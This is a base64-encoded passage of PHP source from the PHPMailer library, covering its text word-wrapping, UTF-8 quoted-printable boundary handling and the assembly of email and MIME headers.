AgICAgIHJldHVybiAkdGhpcy0+ZW5jb2RlSGVhZGVyKCR0aGlzLT5zZWN1cmVIZWFkZXIoJGFkZHJbMV0pLCAncGhyYXNlJykgLiAnIDwnIC4gJHRoaXMtPnNlY3VyZUhlYWRlcigKICAgICAgICAgICAgICAgICRhZGRyWzBdCiAgICAgICAgICAgICkgLiAnPic7CiAgICAgICAgfQogICAgfQoKICAgIC8qKgogICAgICogV29yZC13cmFwIG1lc3NhZ2UuCiAgICAgKiBGb3IgdXNlIHdpdGggbWFpbGVycyB0aGF0IGRvIG5vdCBhdXRvbWF0aWNhbGx5IHBlcmZvcm0gd3JhcHBpbmcKICAgICAqIGFuZCBmb3IgcXVvdGVkLXByaW50YWJsZSBlbmNvZGVkIG1lc3NhZ2VzLgogICAgICogT3JpZ2luYWwgd3JpdHRlbiBieSBwaGlsaXBwZS4KICAgICAqIEBwYXJhbSBzdHJpbmcgJG1lc3NhZ2UgVGhlIG1lc3NhZ2UgdG8gd3JhcAogICAgICogQHBhcmFtIGludGVnZXIgJGxlbmd0aCBUaGUgbGluZSBsZW5ndGggdG8gd3JhcCB0bwogICAgICogQHBhcmFtIGJvb2xlYW4gJHFwX21vZGUgV2hldGhlciB0byBydW4gaW4gUXVvdGVkLVByaW50YWJsZSBtb2RlCiAgICAgKiBAYWNjZXNzIHB1YmxpYwogICAgICogQHJldHVybiBzdHJpbmcKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIHdyYXBUZXh0KCRtZXNzYWdlLCAkbGVuZ3RoLCAkcXBfbW9kZSA9IGZhbHNlKQogICAgewogICAgICAgIGlmICgkcXBfbW9kZSkgewogICAgICAgICAgICAkc29mdF9icmVhayA9IHNwcmludGYoJyA9JXMnLCAkdGhpcy0+TEUpOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICRzb2Z0X2JyZWFrID0gJHRoaXMtPkxFOwogICAgICAgIH0KICAgICAgICAvLyBJZiB1dGYtOCBlbmNvZGluZyBpcyB1c2VkLCB3ZSB3aWxsIG5lZWQgdG8gbWFrZSBzdXJlIHdlIGRvbid0CiAgICAgICAgLy8gc3BsaXQgbXVsdGlieXRlIGNoYXJhY3RlcnMgd2hlbiB3ZSB3cmFwCiAgICAgICAgJGlzX3V0ZjggPSAoc3RydG9sb3dlcigkdGhpcy0+Q2hhclNldCkgPT0gJ3V0Zi04Jyk7CiAgICAgICAgJGxlbGVuID0gc3RybGVuKCR0aGlzLT5MRSk7CiAgICAgICAgJGNybGZsZW4gPSBzdHJsZW4oc2VsZjo6Q1JMRik7CgogICAgICAgICRtZXNzYWdlID0gJHRoaXMtPmZpeEVPTCgkbWVzc2FnZSk7CiAgICAgICAgLy9SZW1vdmUgYSB0cmFpbGluZyBsaW5lIGJyZWFrCiAgICAgICAgaWYgKHN1YnN0cigkbWVzc2FnZSwgLSRsZWxlbikgPT0gJHRoaXMtPkxFKSB7CiAgICAgICAgICAgICRtZXNzYWdlID0gc3Vic3RyKCRtZXNzYWdlLCAwLCAtJGxlbGVuKTsKICAgICAgICB9CgogICAgICAgIC8vU3BsaXQgbWVzc2FnZSBpbnRvIGxpbmVzCiAgICAgICAgJGxpbmVzID0gZXhwbG9kZSgkdGhpcy0+TEUsICRtZXNzYWdlKTsKICAgICAgICAvL01lc3NhZ2Ugd2lsbCBiZSByZWJ1aWx0IGluIGhlcmUKICAgICAgICAkbWVzc2FnZSA9ICcnOwogICAgICAgIGZvcmVhY2ggKCRsaW5lcyBhcyAkbGluZSkgewogICAgICAgICAgICAkd29yZHMgPSBleHBsb2RlKCcgJywgJGxpbmUpOwogICAgICAgICAgICAkYnVmID0gJyc7CiAgICAgICAgICAgICRmaXJzdHdvcmQgPSB0cnVlOwogICAgICAgICAgICBmb3JlYWNoICgkd29yZHMgYXMgJHdvcmQpIHsKICAgICAgICAgICAgICAgIGlmICgkcXBfbW9kZSBhbmQgKHN0cmxlbigkd29yZCkgPiAkbGVuZ3RoKSkgewogICAgICAgICAgICAgICAgICAgICRzcGFjZV9sZWZ0ID0gJGxlbmd0aCAtIHN0cmxlbigkYnVmKSAtICRjcmxmbGVuOwogICAgICAgICAgICAgICAgICAgIGlmICghJGZpcnN0d29yZCkgewogICAgICAgICAgICAgICAgICAgICAgICBpZiAoJHNwYWNlX2xlZnQgPiAyMCkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJGxlbiA9ICRzcGFjZV9sZWZ0OwogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRpc191dGY4KSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGxlbiA9ICR0aGlzLT51dGY4Q2hhckJvdW5kYXJ5KCR3b3JkLCAkbGVuKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZWlmIChzdWJzdHIoJHdvcmQsICRsZW4gLSAxLCAxKSA9PSAnPScpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkbGVuLS07CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2VpZiAoc3Vic3RyKCR3b3JkLCAkbGVuIC0gMiwgMSkgPT0gJz0nKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGxlbiAtPSAyOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBhcnQgPSBzdWJzdHIoJHdvcmQsIDAsICRsZW4pOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHdvcmQgPSBzdWJzdHIoJHdvcmQsICRsZW4pOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgJGJ1ZiAuPSAnICcgLiAkcGFydDsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRtZXNzYWdlIC49ICRidWYgLiBzcHJpbnRmKCc9JXMnLCBzZWxmOjpDUkxGKTsKICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRtZXNzYWdlIC49ICRidWYgLiAkc29mdF9icmVhazsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAkYnVmID0gJyc7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIHdoaWxlIChzdHJsZW4oJHdvcmQpID4gMCkgewogICAgICAgICAgICAgICAgICAgICAgICBpZiAoJGxlbmd0aCA8PSAwKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAkbGVuID0gJGxlbmd0aDsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRpc191dGY4KSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkbGVuID0gJHRoaXMtPnV0ZjhDaGFyQm91bmRhcnkoJHdvcmQsICRsZW4pOwogICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2VpZiAoc3Vic3RyKCR3b3JkLCAkbGVuIC0gMSwgMSkgPT0gJz0nKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkbGVuLS07CiAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZWlmIChzdWJzdHIoJHdvcmQsICRsZW4gLSAyLCAxKSA9PSAnPScpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRsZW4gLT0gMjsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAkcGFydCA9IHN1YnN0cigkd29yZCwgMCwgJGxlbik7CiAgICAgICAgICAgICAgICAgICAgICAgICR3b3JkID0gc3Vic3RyKCR3b3JkLCAkbGVuKTsKCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChzdHJsZW4oJHdvcmQpID4gMCkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJG1lc3NhZ2UgLj0gJHBhcnQgLiBzcHJpbnRmKCc9JXMnLCBzZWxmOjpDUkxGKTsKICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRidWYgPSAkcGFydDsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgJGJ1Zl9vID0gJGJ1ZjsKICAgICAgICAgICAgICAgICAgICBpZiAoISRmaXJzdHdvcmQpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJGJ1ZiAuPSAnICc7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICRidWYgLj0gJHdvcmQ7CgogICAgICAgICAgICAgICAgICAgIGlmIChzdHJsZW4oJGJ1ZikgPiAkbGVuZ3RoIGFuZCAkYnVmX28gIT0gJycpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJG1lc3NhZ2UgLj0gJGJ1Zl9vIC4gJHNvZnRfYnJlYWs7CiAgICAgICAgICAgICAgICAgICAgICAgICRidWYgPSAkd29yZDsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAkZmlyc3R3b3JkID0gZmFsc2U7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgJG1lc3NhZ2UgLj0gJGJ1ZiAuIHNlbGY6OkNSTEY7CiAgICAgICAgfQoKICAgICAgICByZXR1cm4gJG1lc3NhZ2U7CiAgICB9CgogICAgLyoqCiAgICAgKiBGaW5kIHRoZSBsYXN0IGNoYXJhY3RlciBib3VuZGFyeSBwcmlvciB0byAkbWF4TGVuZ3RoIGluIGEgdXRmLTgKICAgICAqIHF1b3RlZC1wcmludGFibGUgZW5jb2RlZCBzdHJpbmcuCiAgICAgKiBPcmlnaW5hbCB3cml0dGVuIGJ5IENvbGluIEJyb3duLgogICAgICogQGFjY2VzcyBwdWJsaWMKICAgICAqIEBwYXJhbSBzdHJpbmcgJGVuY29kZWRUZXh0IHV0Zi04IFFQIHRleHQKICAgICAqIEBwYXJhbSBpbnRlZ2VyICRtYXhMZW5ndGggRmluZCB0aGUgbGFzdCBjaGFyYWN0ZXIgYm91bmRhcnkgcHJpb3IgdG8gdGhpcyBsZW5ndGgKICAgICAqIEByZXR1cm4gaW50ZWdlcgogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gdXRmOENoYXJCb3VuZGFyeSgkZW5jb2RlZFRleHQsICRtYXhMZW5ndGgpCiAgICB7CiAgICAgICAgJGZvdW5kU3BsaXRQb3MgPSBmYWxzZTsKICAgICAgICAkbG9va0JhY2sgPSAzOwogICAgICAgIHdoaWxlICghJGZvdW5kU3BsaXRQb3MpIHsKICAgICAgICAgICAgJGxhc3RDaHVuayA9IHN1YnN0cigkZW5jb2RlZFRleHQsICRtYXhMZW5ndGggLSAkbG9va0JhY2ssICRsb29rQmFjayk7CiAgICAgICAgICAgICRlbmNvZGVkQ2hhclBvcyA9IHN0cnBvcygkbGFzdENodW5rLCAnPScpOwogICAgICAgICAgICBpZiAoZmFsc2UgIT09ICRlbmNvZGVkQ2hhclBvcykgewogICAgICAgICAgICAgICAgLy8gRm91bmQgc3RhcnQgb2YgZW5jb2RlZCBjaGFyYWN0ZXIgYnl0ZSB3aXRoaW4gJGxvb2tCYWNrIGJsb2NrLgogICAgICAgICAgICAgICAgLy8gQ2hlY2sgdGhlIGVuY29kZWQgYnl0ZSB2YWx1ZSAodGhlIDIgY2hhcnMgYWZ0ZXIgdGhlICc9JykKICAgICAgICAgICAgICAgICRoZXggPSBzdWJzdHIoJGVuY29kZWRUZXh0LCAkbWF4TGVuZ3RoIC0gJGxvb2tCYWNrICsgJGVuY29kZWRDaGFyUG9zICsgMSwgMik7CiAgICAgICAgICAgICAgICAkZGVjID0gaGV4ZGVjKCRoZXgpOwogICAgICAgICAgICAgICAgaWYgKCRkZWMgPCAxMjgpIHsKICAgICAgICAgICAgICAgICAgICAvLyBTaW5nbGUgYnl0ZSBjaGFyYWN0ZXIuCiAgICAgICAgICAgICAgICAgICAgLy8gSWYgdGhlIGVuY29kZWQgY2hhciB3YXMgZm91bmQgYXQgcG9zIDAsIGl0IHdpbGwgZml0CiAgICAgICAgICAgICAgICAgICAgLy8gb3RoZXJ3aXNlIHJlZHVjZSBtYXhMZW5ndGggdG8gc3RhcnQgb2YgdGhlIGVuY29kZWQgY2hhcgogICAgICAgICAgICAgICAgICAgIGlmICgkZW5jb2RlZENoYXJQb3MgPiAwKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRtYXhMZW5ndGggPSAkbWF4TGVuZ3RoIC0gKCRsb29rQmFjayAtICRlbmNvZGVkQ2hhclBvcyk7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICRmb3VuZFNwbGl0UG9zID0gdHJ1ZTsKICAgICAgICAgICAgICAgIH0gZWxzZWlmICgkZGVjID49IDE5MikgewogICAgICAgICAgICAgICAgICAgIC8vIEZpcnN0IGJ5dGUgb2YgYSBtdWx0aSBieXRlIGNoYXJhY3RlcgogICAgICAgICAgICAgICAgICAgIC8vIFJlZHVjZSBtYXhMZW5ndGggdG8gc3BsaXQgYXQgc3RhcnQgb2YgY2hhcmFjdGVyCiAgICAgICAgICAgICAgICAgICAgJG1heExlbmd0aCA9ICRtYXhMZW5ndGggLSAoJGxvb2tCYWNrIC0gJGVuY29kZWRDaGFyUG9zKTsKICAgICAgICAgICAgICAgICAgICAkZm91bmRTcGxpdFBvcyA9IHRydWU7CiAgICAgICAgICAgICAgICB9IGVsc2VpZiAoJGRlYyA8IDE5MikgewogICAgICAgICAgICAgICAgICAgIC8vIE1pZGRsZSBieXRlIG9mIGEgbXVsdGkgYnl0ZSBjaGFyYWN0ZXIsIGxvb2sgZnVydGhlciBiYWNrCiAgICAgICAgICAgICAgICAgICAgJGxvb2tCYWNrICs9IDM7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAvLyBObyBlbmNvZGVkIGNoYXJhY3RlciBmb3VuZAogICAgICAgICAgICAgICAgJGZvdW5kU3BsaXRQb3MgPSB0cnVlOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIHJldHVybiAkbWF4TGVuZ3RoOwogICAgfQoKICAgIC8qKgogICAgICogQXBwbHkgd29yZCB3cmFwcGluZyB0byB0aGUgbWVzc2FnZSBib2R5LgogICAgICogV3JhcHMgdGhlIG1lc3NhZ2UgYm9keSB0byB0aGUgbnVtYmVyIG9mIGNoYXJzIHNldCBpbiB0aGUgV29yZFdyYXAgcHJvcGVydHkuCiAgICAgKiBZb3Ugc2hvdWxkIG9ubHkgZG8gdGhpcyB0byBwbGFpbi10ZXh0IGJvZGllcyBhcyB3cmFwcGluZyBIVE1MIHRhZ3MgbWF5IGJyZWFrIHRoZW0uCiAgICAgKiBUaGlzIGlzIGNhbGxlZCBhdXRvbWF0aWNhbGx5IGJ5IGNyZWF0ZUJvZHkoKSwgc28geW91IGRvbid0IG5lZWQgdG8gY2FsbCBpdCB5b3Vyc2VsZi4KICAgICAqIEBhY2Nlc3MgcHVibGljCiAgICAgKiBAcmV0dXJuIHZvaWQKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIHNldFdvcmRXcmFwKCkKICAgIHsKICAgICAgICBpZiAoJHRoaXMtPldvcmRXcmFwIDwgMSkgewogICAgICAgICAgICByZXR1cm47CiAgICAgICAgfQoKICAgICAgICBzd2l0Y2ggKCR0aGlzLT5tZXNzYWdlX3R5cGUpIHsKICAgICAgICAgICAgY2FzZSAnYWx0JzoKICAgICAgICAgICAgY2FzZSAnYWx0X2lubGluZSc6CiAgICAgICAgICAgIGNhc2UgJ2FsdF9hdHRhY2gnOgogICAgICAgICAgICBjYXNlICdhbHRfaW5saW5lX2F0dGFjaCc6CiAgICAgICAgICAgICAgICAkdGhpcy0+QWx0Qm9keSA9ICR0aGlzLT53cmFwVGV4dCgkdGhpcy0+QWx0Qm9keSwgJHRoaXMtPldvcmRXcmFwKTsKICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICBkZWZhdWx0OgogICAgICAgICAgICAgICAgJHRoaXMtPkJvZHkgPSAkdGhpcy0+d3JhcFRleHQoJHRoaXMtPkJvZHksICR0aGlzLT5Xb3JkV3JhcCk7CiAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICB9CiAgICB9CgogICAgLyoqCiAgICAgKiBBc3NlbWJsZSBtZXNzYWdlIGhlYWRlcnMuCiAgICAgKiBAYWNjZXNzIHB1YmxpYwogICAgICogQHJldHVybiBzdHJpbmcgVGhlIGFzc2VtYmxlZCBoZWFkZXJzCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBjcmVhdGVIZWFkZXIoKQogICAgewogICAgICAgICRyZXN1bHQgPSAnJzsKCiAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+aGVhZGVyTGluZSgnRGF0ZScsICR0aGlzLT5NZXNzYWdlRGF0ZSA9PSAnJyA/IHNlbGY6OnJmY0RhdGUoKSA6ICR0aGlzLT5NZXNzYWdlRGF0ZSk7CgogICAgICAgIC8vIFRvIGJlIGNyZWF0ZWQgYXV0b21hdGljYWxseSBieSBtYWlsKCkKICAgICAgICBpZiAoJHRoaXMtPlNpbmdsZVRvKSB7CiAgICAgICAgICAgIGlmICgkdGhpcy0+TWFpbGVyICE9ICdtYWlsJykgewogICAgICAgICAgICAgICAgZm9yZWFjaCAoJHRoaXMtPnRvIGFzICR0b2FkZHIpIHsKICAgICAgICAgICAgICAgICAgICAkdGhpcy0+U2luZ2xlVG9BcnJheVtdID0gJHRoaXMtPmFkZHJGb3JtYXQoJHRvYWRkcik7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBpZiAoY291bnQoJHRoaXMtPnRvKSA+IDApIHsKICAgICAgICAgICAgICAgIGlmICgkdGhpcy0+TWFpbGVyICE9ICdtYWlsJykgewogICAgICAgICAgICAgICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPmFkZHJBcHBlbmQoJ1RvJywgJHRoaXMtPnRvKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfSBlbHNlaWYgKGNvdW50KCR0aGlzLT5jYykgPT0gMCkgewogICAgICAgICAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+aGVhZGVyTGluZSgnVG8nLCAndW5kaXNjbG9zZWQtcmVjaXBpZW50czo7Jyk7CiAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPmFkZHJBcHBlbmQoJ0Zyb20nLCBhcnJheShhcnJheSh0cmltKCR0aGlzLT5Gcm9tKSwgJHRoaXMtPkZyb21OYW1lKSkpOwoKICAgICAgICAvLyBzZW5kbWFpbCBhbmQgbWFpbCgpIGV4dHJhY3QgQ2MgZnJvbSB0aGUgaGVhZGVyIGJlZm9yZSBzZW5kaW5nCiAgICAgICAgaWYgKGNvdW50KCR0aGlzLT5jYykgPiAwKSB7CiAgICAgICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPmFkZHJBcHBlbmQoJ0NjJywgJHRoaXMtPmNjKTsKICAgICAgICB9CgogICAgICAgIC8vIHNlbmRtYWlsIGFuZCBtYWlsKCkgZXh0cmFjdCBCY2MgZnJvbSB0aGUgaGVhZGVyIGJlZm9yZSBzZW5kaW5nCiAgICAgICAgaWYgKCgKICAgICAgICAgICAgICAgICR0aGlzLT5NYWlsZXIgPT0gJ3NlbmRtYWlsJyBvciAkdGhpcy0+TWFpbGVyID09ICdxbWFpbCcgb3IgJHRoaXMtPk1haWxlciA9PSAnbWFpbCcKICAgICAgICAgICAgKQogICAgICAgICAgICBhbmQgY291bnQoJHRoaXMtPmJjYykgPiAwCiAgICAgICAgKSB7CiAgICAgICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPmFkZHJBcHBlbmQoJ0JjYycsICR0aGlzLT5iY2MpOwogICAgICAgIH0KCiAgICAgICAgaWYgKGNvdW50KCR0aGlzLT5SZXBseVRvKSA+IDApIHsKICAgICAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+YWRkckFwcGVuZCgnUmVwbHktVG8nLCAkdGhpcy0+UmVwbHlUbyk7CiAgICAgICAgfQoKICAgICAgICAvLyBtYWlsKCkgc2V0cyB0aGUgc3ViamVjdCBpdHNlbGYKICAgICAgICBpZiAoJHRoaXMtPk1haWxlciAhPSAnbWFpbCcpIHsKICAgICAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+aGVhZGVyTGluZSgnU3ViamVjdCcsICR0aGlzLT5lbmNvZGVIZWFkZXIoJHRoaXMtPnNlY3VyZUhlYWRlcigkdGhpcy0+U3ViamVjdCkpKTsKICAgICAgICB9CgogICAgICAgIC8vIE9ubHkgYWxsb3cgYSBjdXN0b20gbWVzc2FnZSBJRCBpZiBpdCBjb25mb3JtcyB0byBSRkMgNTMyMiBzZWN0aW9uIDMuNi40CiAgICAgICAgLy8gaHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzUzMjIjc2VjdGlvbi0zLjYuNAogICAgICAgIGlmICgnJyAhPSAkdGhpcy0+TWVzc2FnZUlEIGFuZCBwcmVnX21hdGNoKCcvXjwuKkAuKj4kLycsICR0aGlzLT5NZXNzYWdlSUQpKSB7CiAgICAgICAgICAgICR0aGlzLT5sYXN0TWVzc2FnZUlEID0gJHRoaXMtPk1lc3NhZ2VJRDsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAkdGhpcy0+bGFzdE1lc3NhZ2VJRCA9IHNwcmludGYoJzwlc0Alcz4nLCAkdGhpcy0+dW5pcXVlaWQsICR0aGlzLT5zZXJ2ZXJIb3N0bmFtZSgpKTsKICAgICAgICB9CiAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+aGVhZGVyTGluZSgnTWVzc2FnZS1JRCcsICR0aGlzLT5sYXN0TWVzc2FnZUlEKTsKICAgICAgICBpZiAoIWlzX251bGwoJHRoaXMtPlByaW9yaXR5KSkgewogICAgICAgICAgICAkcmVzdWx0IC49ICR0aGlzLT5oZWFkZXJMaW5lKCdYLVByaW9yaXR5JywgJHRoaXMtPlByaW9yaXR5KTsKICAgICAgICB9CiAgICAgICAgaWYgKCR0aGlzLT5YTWFpbGVyID09ICcnKSB7CiAgICAgICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPmhlYWRlckxpbmUoCiAgICAgICAgICAgICAgICAnWC1NYWlsZXInLAogICAgICAgICAgICAgICAgJ1BIUE1haWxlciAnIC4gJHRoaXMtPlZlcnNpb24gLiAnIChodHRwczovL2dpdGh1Yi5jb20vUEhQTWFpbGVyL1BIUE1haWxlciknCiAgICAgICAgICAgICk7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgJG15WG1haWxlciA9IHRyaW0oJHRoaXMtPlhNYWlsZXIpOwogICAgICAgICAgICBpZiAoJG15WG1haWxlcikgewogICAgICAgICAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+aGVhZGVyTGluZSgnWC1NYWlsZXInLCAkbXlYbWFpbGVyKTsKICAgICAgICAgICAgfQogICAgICAgIH0KCiAgICAgICAgaWYgKCR0aGlzLT5Db25maXJtUmVhZGluZ1RvICE9ICcnKSB7CiAgICAgICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPmhlYWRlckxpbmUoJ0Rpc3Bvc2l0aW9uLU5vdGlmaWNhdGlvbi1UbycsICc8JyAuICR0aGlzLT5Db25maXJtUmVhZGluZ1RvIC4gJz4nKTsKICAgICAgICB9CgogICAgICAgIC8vIEFkZCBjdXN0b20gaGVhZGVycwogICAgICAgIGZvcmVhY2ggKCR0aGlzLT5DdXN0b21IZWFkZXIgYXMgJGhlYWRlcikgewogICAgICAgICAgICAkcmVzdWx0IC49ICR0aGlzLT5oZWFkZXJMaW5lKAogICAgICAgICAgICAgICAgdHJpbSgkaGVhZGVyWzBdKSwKICAgICAgICAgICAgICAgICR0aGlzLT5lbmNvZGVIZWFkZXIodHJpbSgkaGVhZGVyWzFdKSkKICAgICAgICAgICAgKTsKICAgICAgICB9CiAgICAgICAgaWYgKCEkdGhpcy0+c2lnbl9rZXlfZmlsZSkgewogICAgICAgICAgICAkcmVzdWx0IC49ICR0aGlzLT5oZWFkZXJMaW5lKCdNSU1FLVZlcnNpb24nLCAnMS4wJyk7CiAgICAgICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPmdldE1haWxNSU1FKCk7CiAgICAgICAgfQoKICAgICAgICByZXR1cm4gJHJlc3VsdDsKICAgIH0KCiAgICAvKioKICAgICAqIEdldCB0aGUgbWVzc2FnZSBNSU1FIHR5cGUgaGVhZGVycy4KICAgICAqIEBhY2Nlc3MgcHVibGljCiAgICAgKiBAcmV0dXJuIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gZ2V0TWFpbE1JTUUoKQogICAgewogICAgICAgICRyZXN1bHQgPSAnJzsKICAgICAgICAkaXNtdWx0aXBhcnQgPSB0cnVlOwogICAgICAgIHN3aXRjaCAoJHRoaXMtPm1lc3NhZ2VfdHlwZSkgewogICAgICAgICAgICBjYXNlICdpbmxpbmUnOgogICAgICAgICAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+aGVhZGVyTGluZSgnQ29udGVudC1UeXBlJywgJ211bHRpcGFydC9yZWxhdGVkOycpOwogICAgICAgICAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+dGV4dExpbmUoIglib3VuZGFyeT1cIiIgLiAkdGhpcy0+Ym91bmRhcnlbMV0gLiAnIicpOwogICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgIGNhc2UgJ2F0dGFjaCc6CiAgICAgICAgICAgIGNhc2UgJ2lubGluZV9hdHRhY2gnOgogICAgICAgICAgICBjYXNlICdhbHRfYXR0YWNoJzoKICAgICAgICAgICAgY2FzZSAnYWx0X2lubGluZV9hdHRhY2gnOgogICAgICAgICAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+aGVhZGVyTGluZSgnQ29udGVudC1UeXBlJywgJ211bHRpcGFydC9taXhlZDsnKTsKICAgICAgICAgICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPnRleHRMaW5lKCIJYm91bmRhcnk9XCIiIC4gJHRoaXMtPmJvdW5kYXJ5WzFdIC4gJyInKTsKICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICBjYXNlICdhbHQnOgogICAgICAgICAgICBjYXNlICdhbHRfaW5saW5lJzoKICAgICAgICAgICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPmhlYWRlckxpbmUoJ0NvbnRlbnQtVHlwZScsICdtdWx0aXBhcnQvYWx0ZXJuYXRpdmU7Jyk7CiAgICAgICAgICAgICAgICAkcmVzdWx0IC49ICR0aGlzLT50ZXh0TGluZSgiCWJvdW5kYXJ5PVwiIiAuICR0aGlzLT5ib3VuZGFyeVsxXSAuICciJyk7CiAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgZGVmYXVsdDoKICAgICAgICAgICAgICAgIC8vIENhdGNoZXMgY2FzZSAncGxhaW4nOiBhbmQgY2FzZSAnJzoKICAgICAgICAgICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPnRleHRMaW5lKCdDb250ZW50LVR5cGU6ICcgLiAkdGhpcy0+Q29udGVudFR5cGUgLiAnOyBjaGFyc2V0PScgLiAkdGhpcy0+Q2hhclNldCk7CiAgICAgICAgICAgICAgICAkaXNtdWx0aXBhcnQgPSBmYWxzZTsKICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgIH0KICAgICAgICAvLyBSRkMxMzQxIHBhcnQgNSBzYXlzIDdiaXQgaXMgYXNzdW1lZCBpZiBub3Qgc3BlY2lmaWVkCiAgICAgICAgaWYgKCR0aGlzLT5FbmNvZGluZyAhPSAnN2JpdCcpIHsKICAgICAgICAgICAgLy8gUkZDIDIwNDUgc2VjdGlvbiA2LjQgc2F5cyBtdWx0aXBhcnQgTUlNRSBwYXJ0cyBtYXkgb25seSB1c2UgN2JpdCwgOGJpdCBvciBiaW5hcnkgQ1RFCiAgICAgICAgICAgIGlmICgkaXNtdWx0aXBhcnQpIHsKICAgICAgICAgICAgICAgIGlmICgkdGhpcy0+RW5jb2RpbmcgPT0gJzhiaXQnKSB7CiAgICAgICAgICAgICAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+aGVhZGVyTGluZSgnQ29udGVudC1UcmFuc2Zlci1FbmNvZGluZycsICc4Yml0Jyk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAvLyBUaGUgb25seSByZW1haW5pbmcgYWx0ZXJuYXRpdmVzIGFyZSBxdW90ZWQtcHJpbnRhYmxlIGFuZCBiYXNlNjQsIHdoaWNoIGFyZSBib3RoIDdiaXQgY29tcGF0aWJsZQogICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+aGVhZGVyTGluZSgnQ29udGVudC1UcmFuc2Zlci1FbmNvZGluZycsICR0aGlzLT5FbmNvZGluZyk7CiAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgICAgIGlmICgkdGhpcy0+TWFpbGVyICE9ICdtYWlsJykgewogICAgICAgICAgICAkcmVzdWx0IC49ICR0aGlzLT5MRTsKICAgICAgICB9CgogICAgICAgIHJldHVybiAkcmVzdWx0OwogICAgfQoKICAgIC8qKgogICAgICogUmV0dXJucyB0aGUgd2hvbGUgTUlNRSBtZXNzYWdlLgogICAgICogSW5jbHVkZXMg